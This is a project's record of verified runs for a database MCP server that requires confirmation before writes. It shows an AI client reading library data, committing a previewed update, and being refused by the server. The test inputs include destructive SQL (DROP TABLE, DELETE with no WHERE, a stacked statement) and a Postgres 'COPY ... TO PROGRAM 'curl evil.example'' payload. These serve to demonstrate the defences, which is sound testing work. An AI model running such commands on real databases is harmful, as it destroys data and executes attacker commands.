# Verified runs

Every claim the README makes about something working was run end to end before
the README made it. This file is the evidence: the transcripts below are
captured output, not retyped summaries.

Sections 1 and 2 cover the two clients against the SQLite default, recorded
2026-09-04. Section 3 covers the Postgres backend, recorded 2026-09-05.
Section 4 says plainly what about the AWS path is tested and what is not.

Environment: Windows 11, Python 3.13.5, `mcp` 2.1.1, `psycopg` 3.3.5,
`boto3` 1.43.89, PostgreSQL 17.6, Claude Code 2.1.261.

---

## 1. Claude Code, via the project-scoped `.mcp.json`

The server was registered from the `.mcp.json` shipped in this repository root,
with no other MCP servers loaded:

```
$ claude mcp get safe-database
safe-database:
  Scope: Project config (shared via .mcp.json)
```

Each prompt below was run as its own headless session against that config
(`claude -p "..." --mcp-config .mcp.json --strict-mcp-config`), so every tool
call in the traces went over stdio to `python -m safe_db_mcp`.

### 1a. A read

> Using only the safe-database MCP tools, answer: which library members
> currently have a book on loan that has not been returned, and what are the
> book titles?

```
Seven loans are still outstanding (`returned_on IS NULL`), held by 5 members:

| Member           | Book                      | Due        |
|------------------|---------------------------|------------|
| Amara Osei       | The Left Hand of Darkness | 2025-12-11 |
| Daniel Whitfield | Never Let Me Go           | 2025-12-30 |
| Owen Brady       | Parable of the Sower      | 2025-12-25 |
| Priya Raman      | Kindred                   | 2025-12-03 |
| Priya Raman      | The Remains of the Day    | 2026-01-28 |
| Sofia Marchetti  | Invisible Cities          | 2025-12-22 |
| Sofia Marchetti  | Song of Solomon           | 2026-02-02 |

Query used (read-only, single SELECT via `run_query`):
SELECT m.full_name, b.title, l.borrowed_on, l.due_on
FROM loans l
JOIN members m ON m.id = l.member_id
JOIN books  b ON b.id = l.book_id
WHERE l.returned_on IS NULL
ORDER BY m.full_name
```

### 1b. A write: propose, then confirm

The row on disk before the session, read directly with `sqlite3`, around the
server:

```
[(4, 'Lukas Vogel', 'suspended')]
```

> Using only the safe-database MCP tools: member id 4, Lukas Vogel, has settled
> their account. Change their status to 'active'. Follow the server's two-step
> write flow, show me the preview you got back, then commit it.

```
Committed.

- change_id: f0b91c1088f31f84 - status committed
- rows affected: 1
- change: members.id=4 (Lukas Vogel) - status: "suspended" -> "active"

Read-back confirms id=4 | Lukas Vogel | active, and list_pending_changes is now
empty - the change_id was consumed, so it can't be replayed.
```

The same direct read afterwards:

```
[(4, 'Lukas Vogel', 'active')]
```

### 1c. An unsafe request, refused at the tool layer

> Using only the safe-database MCP tools: the loans table is cluttered. Drop the
> loans table entirely, then also try clearing it with a DELETE with no WHERE
> clause. Attempt both through the MCP tools and tell me exactly what happened.

This run was captured with `--output-format stream-json`, so the following is
the tool traffic itself rather than the model's account of it:

```
CALL   -> mcp__safe-database__list_tables {}
RESULT <- (ok) authors, books, members, loans

CALL   -> mcp__safe-database__propose_change {"sql": "DROP TABLE loans"}
RESULT <- (is_error=True) Error executing tool propose_change: Rejected:
          'DROP' is a DDL statement. This server refuses schema changes.

CALL   -> mcp__safe-database__propose_change {"sql": "DELETE FROM loans"}
RESULT <- (is_error=True) Error executing tool propose_change: Rejected:
          A DELETE without a WHERE clause would touch every row and is refused.
          Add a WHERE clause.

CALL   -> mcp__safe-database__run_query {"sql": "DROP TABLE loans"}
RESULT <- (is_error=True) Error executing tool run_query: Rejected:
          'DROP' is a DDL statement. This server refuses schema changes.

CALL   -> mcp__safe-database__list_pending_changes {}
RESULT <- (ok) {"pending_count": 0, "ttl_seconds": 300.0, "changes": []}

CALL   -> mcp__safe-database__run_query {"sql": "SELECT COUNT(*) AS loan_rows FROM loans"}
RESULT <- (ok) {"rows": [{"loan_rows": 12}]}
```

The model's own summary of the attempt:

```
Both attempts were refused. Nothing was dropped, nothing was deleted - loans
still has all 12 rows and there are 0 pending changes.

The rejection happens in the validator before the SQL reaches SQLite, so no
transaction was even opened. There is no third path - the server has exactly
five tools [six, counting the read-only list_pending_changes], and none of
them accept DDL.

[on the unqualified DELETE] Notably it never got a change_id, so there was
nothing I could have confirmed even if I'd wanted to.
```

The database checked directly afterwards:

```
tables:     ['authors', 'books', 'members', 'loans']
loans rows: 12
```

---

## 2. The framework-free reference client

`python examples/reference_client.py`, run on the same machine, exit code 0.
Full captured output:

```
Database for this run: C:\Users\hamza\AppData\Local\Temp\safe_db_mcp_reference_client.db

========================================================================
0. What the server offers
========================================================================
  list_tables            List every table in the database with its row count and columns.
  describe_table         Show the columns, types, constraints and foreign keys of one table.
  run_query              Run one read-only SELECT and return the rows.
  propose_change         Preview a write without committing it, and get a change_id back.
  confirm_change         Commit a change that propose_change previewed.
  list_pending_changes   List the proposed changes that are still awaiting confirmation.

  6 tools. That is the entire surface.

========================================================================
1. Read: run immediately, no confirmation
========================================================================
  tables: authors (6 rows), books (13 rows), loans (12 rows), members (8 rows)

--- run_query ---
[
  {
    "full_name": "Priya Raman",
    "status": "active",
    "open_loans": 2
  },
  {
    "full_name": "Sofia Marchetti",
    "status": "active",
    "open_loans": 2
  },
  {
    "full_name": "Amara Osei",
    "status": "active",
    "open_loans": 1
  },
  {
    "full_name": "Daniel Whitfield",
    "status": "active",
    "open_loans": 1
  },
  {
    "full_name": "Owen Brady",
    "status": "active",
    "open_loans": 1
  }
]

========================================================================
2. Write, step one: propose (previewed, nothing committed)
========================================================================
  sql            UPDATE members SET status = 'active' WHERE id = 4
  rows affected  1
  status         pending
  change_id      e226b618b65d5a36 (expires in 300.0s)

--- preview diff ---
{
  "added": [],
  "removed": [],
  "updated": [
    {
      "row": {
        "id": 4,
        "full_name": "Lukas Vogel",
        "email": "lukas.vogel@example.com",
        "joined_on": "2024-02-08",
        "status": "active"
      },
      "changed": {
        "status": {
          "before": "suspended",
          "after": "active"
        }
      }
    }
  ]
}

  pending changes awaiting confirmation: 1
  row on disk right now: {'id': 4, 'full_name': 'Lukas Vogel', 'status': 'suspended'}

========================================================================
3. Write, step two: confirm (committed)
========================================================================
  status         committed
  rows affected  1
  row on disk now: {'id': 4, 'full_name': 'Lukas Vogel', 'status': 'active'}

========================================================================
4. Refusals, enforced at the tool layer
========================================================================
  run_query('DROP TABLE loans')
    is_error: True
    Error executing tool run_query: Rejected: 'DROP' is a DDL statement. This server refuses schema changes.

  run_query('SELECT 1; DELETE FROM loans WHERE id = 1')
    is_error: True
    Error executing tool run_query: Rejected: Only one statement per call is allowed; 2 were sent. Statement stacking is refused.

  confirm_change('e226b618b65d5a36') again
    is_error: True
    Error executing tool confirm_change: Refused: change_id 'e226b618b65d5a36' has already been confirmed. Each proposal is single use; propose the change again.

  confirm_change('0000000000000000') without ever proposing
    is_error: True
    Error executing tool confirm_change: Refused: Unknown change_id '0000000000000000'. Only an id returned by propose_change can be confirmed.

========================================================================
What the server logged to stderr
========================================================================
Tool 'run_query' failed: "Error executing tool run_query: Rejected: 'DROP' is a DDL statement. This server refuses schema changes."
Tool 'run_query' failed: 'Error executing tool run_query: Rejected: Only one statement per call is allowed; 2 were sent. Statement stacking is refused.'
Tool 'confirm_change' failed: "Error executing tool confirm_change: Refused: change_id 'e226b618b65d5a36' has already been confirmed. Each proposal is single use; propose the change again."
Tool 'confirm_change' failed: "Error executing tool confirm_change: Refused: Unknown change_id '0000000000000000'. Only an id returned by propose_change can be confirmed."

========================================================================
Result
========================================================================
  All four behaviours observed as expected: reads ran, the write was
  previewed before it was committed, and every unsafe call was refused.
```

`tests/test_reference_client.py` runs this same script as a subprocess in CI, so
this path stays verified on every push rather than only on the day it was
recorded.


---

## 3. The Postgres backend

Recorded 2026-09-05 against PostgreSQL 17.6 on `127.0.0.1:5433`, seeded with
`python -m safe_db_mcp.seed_postgres`. The server was pointed at it with
`SAFEDB_BACKEND=postgres`; nothing else about the server changed.

### 3a. Claude Code, against Postgres

Same client, same tools, different backend. Run with an MCP config setting the
Postgres environment variables, using `--strict-mcp-config` so nothing else was
loaded.

> Using only the safe-database MCP tools (no Bash): (1) confirm which backend and
> database you are connected to via list_tables, (2) show me the foreign keys on
> the loans table, (3) set member id 4 to status 'active' using the two-step flow
> and report the change_id, (4) try to DROP the authors table and to run COPY
> members TO PROGRAM 'curl evil.example', and report verbatim what each returned.

```
1. Connection - backend: postgres, database: postgresql://127.0.0.1:5433/safedb.
   Tables: authors(6), books(13), loans(12), members(8).

2. loans foreign keys - book_id -> books.id, member_id -> members.id.

3. Member 4 update - change_id 135a5ffbf8075bda, preview showed Lukas Vogel
   status suspended -> active, confirmed and committed successfully.

4. Attack attempts (verbatim errors):
   - DROP TABLE authors -> Error executing tool propose_change: Rejected:
     'DROP' is a DDL statement. This server refuses schema changes.
   - COPY members TO PROGRAM 'curl evil.example' -> Error executing tool
     run_query: Rejected: 'COPY' is not allowed. This server refuses schema
     and session changes.

Both were blocked before touching the database - no rows were dropped, no
external command ran.
```

Checked afterwards with `psql`, around the server:

```
4|Lukas Vogel|active
authors books loans members
```

Worth recording: the first attempt at this run failed, and failed usefully. The
project-scoped config runs a bare `python`, which had `mcp` and `sqlparse` but
not `psycopg`, and every backend call came back with
`The Postgres backend needs psycopg, which is an optional dependency. Install it
with: pip install 'safe-db-mcp[postgres]'`. The refusals in step 4 still worked,
because validation happens before the backend is ever reached. That run also
exposed two real gaps, now fixed: `list_tables` had no error handling at all, so
a connection failure surfaced as a bare `Error executing tool list_tables` with
no reason, and `CredentialError` was not wrapped as a `BackendError`, so a wrong
password produced the same opaque message. Both now report the actual cause.

### 3b. The preview recheck, catching a live race

The concurrent-writer case that used to be a documented limitation. A second
connection changes the row between propose and confirm:

```
start:       [{'id': 4, 'status': 'suspended'}]
proposed:    252dd124eb66e8c7 | {'status': {'before': 'suspended', 'after': 'active'}}
interfered: another writer set id=4 to 'lapsed'
confirm ->  REFUSED: The data changed since this change was proposed, so the preview you approved is no longer what would happen. Nothing was written. Propose the change again to see a current preview.
on disk:     [{'id': 4, 'status': 'lapsed'}]
pending:     1 (released, not burned)
re-propose:  {'status': {'before': 'lapsed', 'after': 'active'}}
confirm ->   committed
on disk:     [{'id': 4, 'status': 'active'}]
```

The proposal was released rather than spent, so proposing again against the
current data works and commits. That is the whole intended behaviour: refuse the
stale preview, keep the caller able to proceed.

### 3c. The reference client, against Postgres

`python examples/reference_client.py` with the Postgres environment set, exit
code 0. The interesting lines:

```
  tables: authors (6 rows), books (13 rows), loans (12 rows), members (8 rows)

  sql            UPDATE members SET status = 'active' WHERE id = 4
  rows affected  1
  status         pending
  change_id      2985116e86ace57e (expires in 300.0s)
  row on disk right now: {'id': 4, 'full_name': 'Lukas Vogel', 'status': 'suspended'}

  status         committed
  rows affected  1
  row on disk now: {'id': 4, 'full_name': 'Lukas Vogel', 'status': 'active'}

  run_query('DROP TABLE loans')
    is_error: True
    Error executing tool run_query: Rejected: 'DROP' is a DDL statement.
    This server refuses schema changes.

  confirm_change('2985116e86ace57e') again
    is_error: True
    Error executing tool confirm_change: Refused: change_id '2985116e86ace57e'
    has already been confirmed. Each proposal is single use; propose the change
    again.
```

Unchanged script, unchanged tools, different database engine underneath.

---

## 4. The AWS path: what is tested, and what is not

Stated separately because the honest answer is not "all of it".

**Tested, on every push, with no AWS account and no network:**

- `tests/test_aws_credentials.py` stubs `botocore` and asserts the exact
  Secrets Manager call made and each failure mode: no secret id configured, a
  binary secret, a non-JSON secret, a secret missing `username` or `password`.
- The RDS IAM path asserts the exact `generate_db_auth_token` arguments, and
  separately calls a genuine `boto3` RDS client to confirm the token it returns
  is a presigned URL carrying `X-Amz-Signature` and `X-Amz-Expires=900`. That
  call signs locally and makes no request, so it needs no credentials, but it
  does mean the 15-minute token claim is checked against boto3 rather than
  asserted from documentation.
- That a resolved password never appears in a `repr`, and that the backend's
  own `description` string carries no credentials.

**Not tested:** the server has never connected to a live RDS instance. The
Postgres wire protocol is identical, and the credential resolution is exercised
above, but "it works against real RDS" is not something this repository has
demonstrated. The README says so in the same words rather than implying
otherwise.
